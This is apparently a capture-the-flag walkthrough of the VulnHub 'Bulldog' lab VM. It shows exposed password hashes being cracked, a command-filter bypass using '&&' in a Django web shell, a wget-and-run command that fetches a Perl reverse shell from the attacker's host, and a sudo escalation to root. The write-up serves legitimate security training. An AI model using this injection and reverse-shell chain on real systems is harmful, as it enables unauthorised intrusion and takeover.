Bulldog is a Boot2Root challenge recently posted on vulnhub.com. I encourage you to try to solve the VM on your own first, or to follow along with the guide on your own machine. The description for the VM is as follows:

<blockquote>
"Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don't you find out? :)

This is a standard Boot-to-Root. Your only goal is to get into the root directory and see the congratulatory message, how you do it is up to you!

Difficulty: Beginner/Intermediate, if you get stuck, try to figure out all the different ways you can interact with the system. That's my only hint ;)

Made by Nick Frichette (frichetten.com) Twitter: @frichette_n

I'd highly recommend running this on Virtualbox, I had some issues getting it to work in VMware. Additionally DHCP is enabled so you shouldn't have any troubles getting it onto your network. It defaults to bridged mode, but feel free to change that if you like."
</blockquote>

After firing up the VM and setting it to use the host-only network adapter, we can get started!

<h2>DISCOVERY</h2>

First we'll begin by discovering the IP address of the VM by using the <strong>netdiscover</strong> tool to scan the subnet by issuing the following command:
<code>netdiscover -r 192.168.56.0/24</code>

![Alt text](/images/bulldog_1.png?raw=true "IP discovery")

The IP of the VM is 192.168.56.101.


<h2>PORT SCAN</h2>

After determining the IP address of the target, the next step is to port scan it. I like to break this process into three stages: a basic <strong>nmap</strong> TCP scan, a full nmap TCP scan with aggressive service fingerprinting, and a UDP nmap scan. I do them in this order because the basic scan is quick and provides some attack surface to start enumerating while the <i>much</i> lengthier second and third scans run. This helps me be more time-efficient. If you don't mind waiting around for a while, you could also skip the basic scan and just run the full aggressive TCP scan and the UDP scan. Whatever you do, don't skip the full TCP or UDP steps; it's not uncommon to notice suspicious services on high ports or UDP ports. You don't want to miss those!

For the sake of keeping things organized, I'll place the results of all three scans here.

Basic scan (run with <code>nmap 192.168.56.101</code>):

![Alt text](/images/bulldog_2.png?raw=true "nmap basic scan")

Full TCP aggressive scan (run with <code>nmap -A -sV -O 192.168.56.101 -p 0-65535</code>):

![Alt text](/images/bulldog_3.png?raw=true "nmap full TCP scan")


UDP scan (run with  <code>nmap -sU 192.168.56.101</code>):

![Alt text](/images/bulldog_4.png?raw=true "nmap UDP scan")


<i>Note: With UDP scans, I just let nmap choose the top 1000 ports rather than performing a full scan. This is because UDP scans take a much, much longer time than TCP scans.</i>


<h2>ENUMERATION</h2>

Now that we know what ports are open and what services are running, we can start the enumeration process. Looks like we've got three services to investigate: SSH (on a non-standard port), HTTP, and a second HTTP instance on port 8080 (the dhcpc UDP service can probably be ignored). Let's examine those one at a time.

<strong>SSH</strong>

A connection can be attempted with this command:
<code>ssh 192.168.56.101 -p 23</code>

This simply prompts for a password. Occasionally SSH will display a banner with some useful information, but in this case it doesn't look like there's much to see. Since SSH is rarely vulnerable these days unless it's been horrifically misconfigured, we can probably move on for now.

<strong>HTTP</strong>

Browsing to the index page shows the name "Bulldog Industries" and this chunk of text (as well as a picture of a bulldog):
<blockquote>
Thank you for visiting Bulldog Industries' website, the world's number one purveyor of high quality English Bulldog photography! Unfortunately we are suspending business operations until further notice. On the first of this month, we were made aware of a breach of our technology systems. We are currently assessing the possibility that hackers may have gotten access to customer payment information. Do not be alarmed as we will be providing simple credit monitoring for all affected customers.

For more information on this, please see our public disclosure notice found below.
</blockquote>


There's a link to the referenced disclosure notice, so it makes sense to read that:
<blockquote>
To our valued customers,

On the first of this month our technical analysts discovered a breach of our payment card systems. I don’t know how these hackers did it. Our technical folk are telling me something about a clam shell and a smelly cow? I'm not sure about all of that.

To prove Bulldog Industries’ commitment to our customers I fired all of our existing technical staff. All of them! We are going to restart from the ground up! No more excuses! Our tech guys will have to make due with what they’ve got. We even increased their budget 1%!

You gotta see the neck beards on the new guys! Real tech hipsters. Zuckerberg types. They know their stuff, security wont be a problem from now on!

I'd like to remind our valued customers that we will be providing basic credit monitoring services as a result of this breach (if you’ve made a purchase of $100 or more).

Your true friend,

Winston Churchy (CEO)
</blockquote>

The most useful piece of information here is the name "Winston Churchy" which might be a username. We'll jot that down. Other than that, the notice is amusing but not particularly informative for our purposes.

The next step is to run some basic enumeration tools. It's important to have a clearly defined process for enumerating services so that you don't forget to check for simple things. I generally start by scanning the site with the tool <strong>nikto</strong>, and then follow up by performing some directory brute forcing with either <strong>dirb</strong> or <strong>dirbuster</strong>. 

A nikto scan can be run with the following command:
<code>nikto -h http://192.168.56.101/ </code>

![Alt text](/images/bulldog_5.png?raw=true "nikto scan")

The most useful piece of information nikto provided was the presence of the /dev/ directory. We'll check that in a minute, but first let's perform that directory brute-force. Initially I tried this with the <strong>dirb</strong> tool, but quickly got some connection errors after running the tool for a few seconds. I thought this might be due to making too many requests within a short period of time, so I switched to <strong>dirbuster</strong>, because that tool can limit the request rate to a single thread for slower request rates. I am unaware of an option to reduce the speed of requests with dirb (but please let me know if there is one!).

I configured dirbuster to run with these settings:

![Alt text](/images/bulldog_6.png?raw=true "dirbuster config")

In the meantime, we can check the /robots.txt file, which commonly contains interesting directories. However, in this case, it's just a banner left over from the site being compromised. 

After a few minutes of brute-forcing, dirbuster has turned up some more directories to check.

![Alt text](/images/bulldog_7.png?raw=true "dirbuster results")

The /admin and /admin/login directories look the most interesting. dirbuster can keep running in the background, but since that scan is going to take a very, very long time, let's start looking at the directories we've found so far. We can start with /dev/.

![Alt text](/images/bulldog_8.png?raw=true "/dev dir")

This page shows an introduction for new employees, and provides quite a bit of useful information about the site. The full text is below:
<blockquote>

If you're reading this you're likely a contractor working for Bulldog Industries. Congratulations! I'm your new boss, Team Lead: Alan Brooke. The CEO has literally fired the entire dev team and staff. As a result, we need to hire a bunch of people very quickly. I'm going to try and give you a crash course on Bulldog Industries website.

How did the previous website get attacked?

An APT exploited a vulnerability in the webserver which gave them a low-privilege shell. From there they exploited dirty cow to get root on the box. After that, the entire system was taken over and they defaced the website. We are still transitioning from the old system to the new one. In the mean time we are using some files which may be corrupted from the original system. We haven't had a chance to make sure there were no lingering traces of the hack so if you find any, send me an email.

How are we preventing future breaches?

At the request of Mr. Churchy, we are removing PHP entirely from the new server. Additionally we will not be using PHPMyAdmin or any other popular CMS system. We have been tasked with creating our own.

Design of new system?

The new website will be written entirely in Django (Mr. Churchy requested "high-end tech hipster stuff"). As of right now, SSH is enabled on the system. This will be turned off soon as we will transition to using Web-Shell, a proprietary shell interface. This tool is explained at the link below. Additionally, be aware that we will start using MongoDB, however we haven't fully installed that yet.

Also be aware that we will be implementing a revolutionary AV system that is being custom made for us by a vendor. It touts being able to run every minute to detect intrusion and hacking. Once that's up and running we will install it on the system.

Web-Shell

Who do I talk to to get started?

Team Lead: alan@bulldogindustries.com
Back-up Team Lead: william@bulldogindustries.com

Front End: malik@bulldogindustries.com
Front End: kevin@bulldogindustries.com

Back End: ashley@bulldogindustries.com
Back End: nick@bulldogindustries.com

Database: sarah@bulldogindustries.com
</blockquote>

Aside from info about the platform, there's also a set of email addresses that could very well be usernames later on. Let's add those to our working list of possible login info. That link to the web shell also looks promising, but unfortunately, visiting /dev/shell shows the message "Please authenticate with the server to use Web-Shell" and nothing else. It's very likely we need to find some login mechanism and valid credentials before this functionality is available.

While I was working on this machine, I wasted a chunk of time on other things without fully investing the rest of the /dev page. If you view the HTML source, you'll find this helpful comment (formatting slightly edited here for the sake of readability):
<blockquote>
Need these password hashes for testing. Django's default is too complex
We'll remove these in prod. It's not like a hacker can do anything with a hash
	Team Lead: alan@bulldogindustries.com -- 6515229daf8dbdc8b89fed2e60f107433da5f2cb <br>
	Back-up Team Lead: william@bulldogindustries.com -- 38882f3b81f8f2bc47d9f3119155b05f954892fb <br>
	Front End: malik@bulldogindustries.com c6f7e34d5d08ba4a40dd5627508ccb55b425e279 <br>
	Front End: kevin@bulldogindustries.com -- 0e6ae9fe8af1cd4192865ac97ebf6bda414218a9 <br>
	Back End: ashley@bulldogindustries.com -- 553d917a396414ab99785694afd51df3a8a8a3e0 <br>
	Back End: nick@bulldogindustries.com -- ddf45997a7e18a25ad5f5cf222da64814dd060d5 <br>
	Database: sarah@bulldogindustries.com -- d8b8dd5e7f000b8dea26ef8428caf38c04466b3e <br>
</blockquote>

There's a handy list of SHA-1 hashes for every user! I should've picked up on this right away, but because I didn't have a well-defined enough process, I forgot the step of always checking out the source code of a page. Make sure this is something you do in order to avoid my mistake.

You can crack these hashes with <strong>John the Ripper</strong> or another password-cracking tool, or you can try using online crackers (or just try searching the hashes themselves online). Whatever method you choose, you'll find that this hash, belonging to the user sarah:
d8b8dd5e7f000b8dea26ef8428caf38c04466b3e

Cracks to this value:
bulldoglover

Now we have some credentials to try. This seems like a good time to check out the /admin directory.

![Alt text](/images/bulldog_9.png?raw=true "/admin dir")

This displays a Django administration login page. Let's try the username "sarah@bulldogindustries.com" and the password "bulldoglover".

Hmm...that doesn't work. What about the username "sarah" instead of the full email?

Ah! That works. Unfortunately, the interface is pretty bare-bones.

![Alt text](/images/bulldog_10.png?raw=true "django administration panel")

Specifically, the "You don't have permission to edit anything" message is a bummer. But we're an authenticated user now, and that means we should check out /dev/shell again. When we do, we're presented with a much more exciting screen than last time:

![Alt text](/images/bulldog_11.png?raw=true "web shell")

This looks like some kind of restricted shell or "jail" shell that just happens to be running on a web server. Now we've hit a point where our next steps will probably be focused on exploitation, so before we get too far down the rabbit hole, let's finish our enumeration; there's still a service running on port 8080, remember?

<strong>Port 8080 (HTTP)</strong>

This enumeration process turns out to be very short, because the HTTP service on port 8080 appears to be running an exact clone of the service on port 80, right down to the exposed password hashes in /dev. However, because there are sometimes subtle differences in services like this, it's still worth performing the same enumeration process (nikto, then dirbuster) on this service. While those tools are running, let's jump into trying to exploit that web shell!

<h2>EXPLOITATION</h2>

Running one of the permitted shell commands returns the results of the command in the web browser, as we'd expect. Additionally, any of the allowed commands can be run with flags; for example, we can run <code>ls -al</code>.

![Alt text](/images/bulldog_12.png?raw=true "jail shell")

This functionality is interesting, as sometimes commands will allow flags that spawn an interactive shell (which hopefully doesn't have the restrictions of the jail shell). Unfortunately for us, the commands we have are pretty limited, so that isn't likely to be an option in this case. However, we can still try to dig around in the file system a bit and see what information might be useful for obtaining a more fully-functional shell.

Issuing the command <code>cat /etc/passwd</code> outputs all the system users. Two lines in particular stands out:

bulldogadmin: x :1000:1000:bulldogadmin,,,:/home/bulldogadmin:/bin/bash <br>
django: x :1001:1001:,,,:/home/django:/bin/bash <br>

The user "bulldogadmin" has a home dir and bash login shell, so it's worth adding that username to the list. The same is true of the "django" user. Perhaps it'll be possible to brute-force the SSH service with these usernames and exploit a weak password. To test the permissions of the web shell user, let's try issuing the command <code>cat /etc/shadow</code>.

This returns a "Server Error (500)", which means that the web server must not be running as root (which they very rarely are, but it's worth checking just to make sure there's not a terrible, terrible misconfiguration, since being able to grab the password hashes out of /etc/shadow could make for a quick win). 

It might be interesting to examine the "bulldog" directory:
Command : ls -al bulldog

total 52
drwxrwxr-x 4 django django 4096 Aug 24 23:23 .
drwxrwxr-x 3 django django 4096 Oct 25 19:49 ..
-rw-r--r-- 1 django django    0 Aug 16 23:51 __init__.py
-rw-r--r-- 1 django django  138 Aug 16 23:55 __init__.pyc
-rw-r--r-- 1 django django 2762 Aug 24 01:23 settings.py
-rw-r--r-- 1 django django 2971 Aug 24 23:23 settings.pyc
drwxrwxr-x 4 django django 4096 Aug 24 00:52 static
drwxrwxr-x 2 django django 4096 Sep 21 00:36 templates
-rw-r--r-- 1 django django 1154 Aug 18 03:11 urls.py
-rw-r--r-- 1 django django 1477 Aug 24 23:23 urls.pyc
-rw-rw-r-- 1 django django  995 Aug 19 05:23 views.py
-rw-rw-r-- 1 django django 1927 Aug 19 05:24 views.pyc
-rw-r--r-- 1 django django  391 Aug 16 23:51 wsgi.py
-rw-r--r-- 1 django django  595 Aug 16 23:55 wsgi.pyc


Looks like that dir has some configuration scripts of some sort. The "views.py" file contents should catch your eye:
<code>
Command : cat bulldog/views.py

from django.shortcuts import render
import subprocess

commands = ['ifconfig','ls','echo','pwd','cat','rm']

def homepage(request):
    return render(request, 'index.html')

def notice(request):
    return render(request, 'notice.html')

def dev(request):
    return render(request, 'dev.html')

def shell(request):
    if request.method == "POST":
	command = request.POST.get("command", None)
	to_return = "Command : " + command + "\n\n"

	if validate(command):
	    execute = subprocess.check_output(command, shell=True)
	    to_return += execute
  	elif ";" in command:
	    to_return += "INVALID COMMAND. I CAUGHT YOU HACKER! ';' CAN BE USED TO EXECUTE MULTIPLE COMMANDS!!"
	else:
	    to_return += "INVALID COMMAND. I CAUGHT YOU HACKER!"

	context = {'data': to_return}
	return render(request, 'shell.html', context)
    return render(request, 'shell.html')

def validate(command):
    if any(com in command for com in commands) and ";" not in command:
        return True
    return False

</code>

This looks like the script responsible for validating our shell commands. If we can find a flaw, we might be able to break out of the jail shell. In particular, the validate() function looks critical:
<code>
def validate(command):
    if any(com in command for com in commands) and ";" not in command:
        return True
    return False
</code>

So this function checks that the shell command we've issued is in the list of allowed commands, and that a semicolon isn't in the command. The shell() function (which calls the validate() function) will print this message if there is a semicolon present:
"INVALID COMMAND. I CAUGHT YOU HACKER! ';' CAN BE USED TO EXECUTE MULTIPLE COMMANDS!!"

It appears that the validate() function must only ensure that the <i>first</i> command issued matches the list of allowed commands. If multiple commands could be chained together, later ones wouldn't be validated, and could probably be whatever command we wanted! That's what this script is trying to stop by checking for semicolons, since semicolons can be used for issuing multiple commands on one line. However, the semicolon certainly isn't the only way to do that. What happens if instead we use the double ampersands (&&) to issue multiple commands?

![Alt text](/images/bulldog_13.png?raw=true "jailbreak")

Ah! After the ouptut of the (legitimate) ls command, we can see the output of the id command! We've now successfully broken out of the jail shell. However, the web interface is still pretty unwieldy; it'd be nicer if we had a more complete interactive shell. One way to get a shell on the box would be to use the <strong>wget</strong> utility, download a reverse shell from the attacker's web server, then set up a listener on our attacking box and execute the reverse shell from the web interface. The presence of wget can be verified by issuing the following command:
<code>ls && which wget</code>

This command reveals that wget is present and can be found in /usr/bin/wget. Now we need to find an appropriate shell. Recall that the discussion of the previous compromise of the website stated that PHP will no longer be used, so PHP probably isn't a good choice. However, perl is installed on the victim machine, so we could leverage that by using a perl reverse shell. If you're running Kali, there's a perl shell already available at /usr/share/webshells/perl/perl-reverse-shell.pl. If not, you can obtain this shell here:
http://pentestmonkey.net/tools/web-shells/perl-reverse-shell

Next, this can be placed in the Apache web server directory (or a different directory if you'd like to use something like Python's SimpleHTTPServer insead). Make sure you edit the shell so that these lines reflect your IP address and desired port for catching the shell: 

my $ip = '127.0.0.1'; <br>
my $port = 1234; <br>

In my case I'll be using port 443, and my IP address is 192.168.56.102. Make sure to replace those values with the ones relevant to you if you're following along. Finally, start your web server (if you're using Apache, run this command: <code>service apache2 start</code>).

Set up your listener to catch the shell:
<code>nc -nlvp 443</code>

Now we need to use wget on the victim to download the shell and write it to somewhere. This can be accomplished with this command:
<code>ls && wget http://192.168.56.102/perl-reverse-shell.pl -O /tmp/perl-reverse-shell.pl && perl /tmp/perl-reverse-shell.pl</code>

![Alt text](/images/bulldog_14.png?raw=true "reverse shell")

Woo! We've got a fully interactive shell!

<h2>PRIVILEGE ESCALATION</h2>

We're brought in as the "django" user. This is where the enumeration process starts over; we've now got to collect as much information as possible about the machine and determine what flaws might exist to allow us to gain root privileges. Generally, I like to start with checking the /home directory for anything interesting. The /home/bulldogadmin directory could contain useful information. Checking it carefully reveals something unusual:
$ ls -al
total 40
drwxr-xr-x 5 bulldogadmin bulldogadmin 4096 Sep 21 00:45 .
drwxr-xr-x 4 root         root         4096 Aug 24 23:16 ..
-rw-r--r-- 1 bulldogadmin bulldogadmin  220 Aug 24 22:39 .bash_logout
-rw-r--r-- 1 bulldogadmin bulldogadmin 3771 Aug 24 22:39 .bashrc
drwx------ 2 bulldogadmin bulldogadmin 4096 Aug 24 22:40 .cache
drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Sep 21 00:44 .hiddenadmindirectory
drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Aug 25 03:18 .nano
-rw-r--r-- 1 bulldogadmin bulldogadmin  655 Aug 24 22:39 .profile
-rw-rw-r-- 1 bulldogadmin bulldogadmin   66 Aug 25 03:18 .selected_editor
-rw-r--r-- 1 bulldogadmin bulldogadmin    0 Aug 24 22:45 .sudo_as_admin_successful
-rw-rw-r-- 1 bulldogadmin bulldogadmin  217 Aug 24 23:20 .wget-hsts

That .hiddenadmindirectory could be important. It contains two files: a note, and something called customPermissionApp.

<blockquote>
$ cat note
Nick,

I'm working on the backend permission stuff. Listen, it's super prototype but I think it's going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! 

It's great stuff! Once I'm finished with it, a hacker wouldn't even be able to reverse it! Keep in mind that it's still a prototype right now. I am about to get it working with the Django user account. I'm not sure how I'll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?

Let me know what you think of it!

-Ashley
</blockquote>

Since we're already the Django user, this seems like something to investigate. However, we don't have permission to actually run the customPermissionApp. The reference to reverse engineering the app means that maybe there's some useful info there. While we could try to SCP the file to our attacking back for further analysis, let's take a quick look from the victim machine. The <strong>strings</strong> utility is a great tool for first steps during reverse engineering; it extracts all human-readable strings from a file. 

![Alt text](/images/bulldog_15.png?raw=true "strings")

The section I've highlighted contains some interesting content:
SUPERultH
imatePASH
SWORDyouH
CANTget
dH34%(
AWAVA
AUATL

It's a little hard to tell what's actually part of that string and what's just junk, but paring it down a little, we get:
SUPERultHimatePASHSWORDyouHCANTget

Might this be the password for the django user? We could test by trying to run the command seen in the strings output, <code>sudo su root</code>. However, the perl shell isn't a full TTY, so we'll have some issues running that command from here. However, we can try to log in as django over SSH.
<code>ssh django@192.168.56.101</code>

Providing "SUPERultHimatePASHSWORDyouHCANTget" as the password results in a failed login. What if we tried scrubbing those "H"s from the password?
SUPERultimatePASSWORDyouCANTget

That looks more normal. Let's try to connect via SSH again using this password.

![Alt text](/images/bulldog_16.png?raw=true "ssh")

Yay, that worked! Finally, let's try to become root:
<code>sudo su root</code>

And that worked! We've now rooted the box.

![Alt text](/images/bulldog_17.png?raw=true "root")

Thanks to @frichette_n for a really enjoyable boot2root, and thanks to VulnHub for hosting these great resources! 




